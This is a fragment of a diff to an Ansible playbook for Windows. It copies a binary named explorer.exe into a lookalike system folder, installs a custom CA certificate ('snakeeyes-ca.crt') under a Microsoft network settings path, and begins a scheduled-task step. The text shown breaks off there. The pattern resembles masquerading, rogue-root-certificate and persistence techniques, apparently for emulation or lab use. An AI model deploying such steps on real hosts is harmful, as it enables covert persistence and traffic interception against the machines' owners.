@@ -9,10 +9,10 @@
     src: "explorer.exe"
     dest: "C:\\Windows\\SystemApps\\Microsoft.Windows.FileExplorer_xyw5h1lvcb\\explorer.exe"
 
-- name: Copy certificate
+- name: Copy CA cert to Windows Host
   ansible.windows.win_copy:
-    src: "win-selfsigned.crt"
-    dest: "C:\\ProgramData\\Microsoft\Network\\Settings\\cert.crt"
+    src: "snakeeyes-ca.crt"
+    dest: "C:\\ProgramData\\Microsoft\\Network\\Settings\\snakeeyes-ca.crt"
 
 - name: Create scheduled task
   community.windows.win_scheduled_task:
